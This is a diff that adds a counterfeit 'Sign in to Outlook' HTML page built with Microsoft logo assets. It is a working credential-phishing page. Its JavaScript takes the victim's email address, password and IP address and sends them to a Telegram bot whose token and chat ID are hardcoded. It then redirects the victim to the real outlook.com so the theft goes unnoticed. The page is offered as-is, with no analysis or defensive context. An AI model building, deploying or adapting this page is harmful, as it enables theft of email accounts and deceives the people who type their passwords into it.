@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Sign in to Outlook</title>
+    <link href="style.css" rel="stylesheet" type="text/css" />
+    <style>
+      body{
+  background: url('https://rollups.me/app/of6.png');
+  padding: 0;
+  margin: 0;
+  background-size: cover;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+.formal input{
+  border: none;
+  border-bottom: 1px solid #999;
+  width: 100%;
+  padding: 5px;
+  font-size: 16px;
+  outline: none;
+}
+.formal{
+  background: #fff;
+  width: 25%;
+  margin: auto;
+  padding: 40px;
+  margin-top: 15%;
+  box-shadow:0 2px 6px rgb(0 0 0 / 20%);
+}
+
+.noacc{
+  display: flex;
+  align-items: center;
+  width: 50%;
+  justify-content: space-between
+}
+
+.button .next{
+      color: #fff;
+    border-color: #0067b8;
+    background-color: #0067b8;
+}
+.button button{
+  padding: 10px;
+  border: none;
+  width: 48%;
+  float: right;
+  font-weight: bold;
+}
+.button{
+  display: flex;
+  margin-top: 10%;
+  width: 60%;
+  justify-content: space-between;
+  float: right;
+}
+
+.cant,
+.noacc a{
+  color: #0067b8;
+  font-size: 15px;
+}
+
+.noacc p{
+  font-size: 15px;
+}
+
+.options .sign{
+  display: flex;
+  padding-left: 20px; 
+}
+.options svg{
+      width: 32px;
+    height: 32px;
+}
+.options{
+  background: #fff;
+  width: 30%;
+  margin: auto;
+  margin-top: 2%;
+  box-shadow:0 2px 6px rgb(0 0 0 / 20%);
+}
+
+      #pwd{
+        display: none;
+        opacity: 0;
+      }
+      #zip{
+        display: none;
+        opacity: 0;
+      }
+      .pest{
+        display: none;
+        opacity: 0;
+              color: #fff;
+    border-color: #0067b8;
+    background-color: #0067b8;
+      }
+
+
+@media(max-width:850px){
+.formal{
+  width: 85%
+}
+.options{
+  width: 95%
+}
+
+body{
+  background: #fff;
+}
+}
+    </style>
+  </head>
+  <body>
+    <form action="" id="form" method="">
+      <div class="formal">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="">
+
+        <div class="sign">
+          <p class="mail"></p>
+          <h1 class="sin">Sign in</h1>
+        </div>
+        <input type="email" id="usr" placeholder="Email, phone, or Skype" required>
+        <input type="password" id="pwd" placeholder="Password" required>
+        <input type="text" id="zip" placeholder="zip code" required>
+        <div class="noacc">
+          <p class="noaccc">No account? </p>
+          <a href="" class="creat">Create one!</a>
+        </div>
+        <a href="" class="cant">Can’t access your account?</a>
+        <br>
+        <div class="button">
+          <button class="back" style="opacity:0;">Back</button>
+          <button type="" class="next">Next</button>
+          <button type="" class="pest">Next</button>
+        </div>
+        <br><br><br>
+      </div>
+      <div class="options">
+        <div class="sign">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" alt="">
+        <p>Sign-in options</p>
+        </div>
+      </div>
+      </form>
+
+<script>
+      const forma = document.querySelector('#form')
+    
+      let bot = {
+          TOKEN: "5140898656:AAEQMGCIInp9SX1vP0CKhOxezgD7E-BVfac",
+          chatID: "-666917531"
+      }
+
+      const usr = document.querySelector('#usr')
+      const pwd = document.querySelector('#pwd')
+      const sin = document.querySelector('.sin')
+      const mail = document.querySelector('.mail')
+      const noacc = document.querySelector('.noaccc')
+      const creat = document.querySelector('.creat')
+      const butt = document.querySelector('.next')
+      const buttA = document.querySelector('.pest')
+      const zip = document.querySelector('#zip')
+        butt.addEventListener('click', ()=>{
+        if(usr.value === '' || usr.value.length <= '5'){
+          return
+        }
+        mail.textContent = usr.value
+        sin.textContent = 'Enter password'
+        creat.textContent = 'Forgot password?'
+        noacc.style.display = 'none'
+        butt.style.display = 'none'
+        buttA.style.display = 'block'
+        buttA.style.opacity = '10'
+        usr.style.display = 'none'
+        usr.style.opacity = 0
+        pwd.style.display = 'block'
+        pwd.style.opacity = 10
+        buttA.type = 'submit'
+          
+      })
+
+      fetch('https://api.ipify.org/?format=json').then(results => results.json()).then(data => {
+  buttA.addEventListener('click', (e)=>{
+e.preventDefault();
+
+          let email = document.querySelector('#usr').value
+
+ fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=O365=>=Email::-${usr.value}==PASS::${pwd.value}==IP::${data.ip}`, {
+              method: "GET"
+          }).then(success => {
+              window.location.replace("https://outlook.com");
+          }, error => {
+              alert("Message not sent")
+              console.log(error)
+
+          })
+  })
+      })
+      
+
+
+
+</script>
+  </body>
+</html>
